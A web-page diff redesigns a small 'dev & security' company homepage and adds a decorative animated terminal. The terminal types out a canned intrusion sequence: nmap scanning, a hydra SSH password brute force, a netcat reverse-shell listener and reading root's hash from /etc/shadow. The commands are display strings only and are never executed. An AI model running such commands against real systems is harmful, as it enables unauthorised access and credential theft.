@@ -1,11 +1,191 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>24kb.it - dev & security</title>
+    <style>
+        body {
+            font-family: "HelveticaNeue-Light", Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+        }
+        .logo-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .info-text {
+            text-align: center;
+        }
+        .terminal-container {
+            width: 100%;
+            height: 33vh;
+            background-color: #000;
+            color: #0f0;
+            font-family: monospace;
+            margin-top: auto;
+            overflow: hidden;
+            position: relative;
+        }
+        .terminal-content {
+            padding: 10px;
+            white-space: pre-wrap;
+            overflow-y: auto;
+            height: calc(100% - 20px);
+        }
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 15px;
+            background-color: #0f0;
+            animation: blink 1s step-end infinite;
+            vertical-align: middle;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
 <body>
+    <div class="logo-container">
+        <img src="24kb.png" alt="24kb">
+    </div>
+    
+    <h3 class="info-text">dev & security</h3>
+    <h5 class="info-text">info@24kb.it</h5>
+    
+    <div class="terminal-container">
+        <div class="terminal-content" id="terminal"></div>
+    </div>
 
-<center><img src="24kb.png"
-     alt="24kb"></center>
-
-<h3><center><font face="HelveticaNeue-Light" >dev & security</font></center></h3>
-<h5><center><font face="HelveticaNeue-Light" >info@24kb.it</font></center></h5>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const terminal = document.getElementById('terminal');
+            const commands = [
+                { 
+                    cmd: 'nmap -sS -p 22,80,443 192.168.1.0/24', 
+                    output: 'Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-13 12:00 CEST\nNmap scan report for 192.168.1.10\nHost is up (0.00023s latency).\n\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https'
+                },
+                { 
+                    cmd: 'whois example.com', 
+                    output: 'Domain Name: EXAMPLE.COM\nRegistrar: Example Registrar, Inc.\nUpdated Date: 2025-04-01T12:00:00Z\nCreation Date: 1995-08-13T04:00:00Z\nRegistry Expiry Date: 2026-08-12T04:00:00Z'
+                },
+                { 
+                    cmd: 'curl -s http://example.com/admin | grep \'login\'', 
+                    output: '<form id="login" action="/admin/login" method="post">'
+                },
+                { 
+                    cmd: 'hydra -l admin -P rockyou.txt 192.168.1.10 ssh', 
+                    output: '[22][ssh] host: 192.168.1.10   login: admin   password: 123456'
+                },
+                { 
+                    cmd: 'ssh admin@192.168.1.10', 
+                    output: 'admin@192.168.1.10\'s password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-70-generic x86_64)\nLast login: Tue May 13 11:45:00 2025 from 192.168.1.100'
+                },
+                { 
+                    cmd: 'sudo -l', 
+                    output: 'Matching Defaults entries for admin on this host:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nUser admin may run the following commands on this host:\n    (ALL : ALL) ALL'
+                },
+                { 
+                    cmd: 'find / -perm -4000 2>/dev/null', 
+                    output: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/gpasswd'
+                },
+                { 
+                    cmd: 'nc -lvnp 4444', 
+                    output: 'listening on [any] 4444 ...\nconnect to [192.168.1.100] from (UNKNOWN) [192.168.1.10] 54321\nbash: no job control in this shell\nadmin@target:/home/admin$'
+                },
+                { 
+                    cmd: 'cat /etc/shadow | grep root', 
+                    output: 'root:$6$randomsalt$encryptedhash:19000:0:99999:7:::'
+                },
+                { 
+                    cmd: 'exit', 
+                    output: 'logout\nConnection to 192.168.1.10 closed.'
+                }
+            ];
+            
+            let cmdIndex = 0;
+            let charIndex = 0;
+            let outputStarted = false;
+            
+            function typeText() {
+                if (cmdIndex >= commands.length) {
+                    cmdIndex = 0; // Loop back to start
+                    terminal.innerHTML = '';
+                }
+                
+                const currentCmd = commands[cmdIndex];
+                
+                if (!outputStarted) {
+                    // Typing the command
+                    if (charIndex === 0) {
+                        terminal.innerHTML += '$ ';
+                    }
+                    
+                    if (charIndex < currentCmd.cmd.length) {
+                        terminal.innerHTML += currentCmd.cmd.charAt(charIndex);
+                        charIndex++;
+                        setTimeout(typeText, 50); // Simulating typing speed from bash script (0.05s)
+                    } else {
+                        terminal.innerHTML += '<br>';
+                        outputStarted = true;
+                        charIndex = 0;
+                        setTimeout(typeText, 300); // Pause before showing output (0.3s from bash script)
+                    }
+                } else {
+                    // Showing the output line by line
+                    if (currentCmd.output) {
+                        const lines = currentCmd.output.split('\n');
+                        let lineIndex = 0;
+                        
+                        function printLine() {
+                            if (lineIndex < lines.length) {
+                                terminal.innerHTML += lines[lineIndex] + '<br>';
+                                lineIndex++;
+                                setTimeout(printLine, 100); // 0.1s delay between lines from bash script
+                            } else {
+                                // Output finished
+                                terminal.innerHTML += '<br>';
+                                outputStarted = false;
+                                charIndex = 0;
+                                cmdIndex++;
+                                
+                                // Add cursor at the end
+                                terminal.innerHTML += '$ <span class="cursor"></span>';
+                                
+                                // Scroll to bottom
+                                terminal.scrollTop = terminal.scrollHeight;
+                                
+                                // Wait before starting next command (0.5s from bash script)
+                                setTimeout(typeText, 500);
+                            }
+                        }
+                        
+                        printLine();
+                    } else {
+                        // No output, move to next command
+                        terminal.innerHTML += '<br>';
+                        outputStarted = false;
+                        charIndex = 0;
+                        cmdIndex++;
+                        
+                        // Add cursor at the end
+                        terminal.innerHTML += '$ <span class="cursor"></span>';
+                        
+                        // Wait before starting next command
+                        setTimeout(typeText, 500);
+                    }
+                }
+            }
+            
+            // Start typing after a short delay
+            setTimeout(typeText, 1000);
+        });
+    </script>
 </body>
 </html>
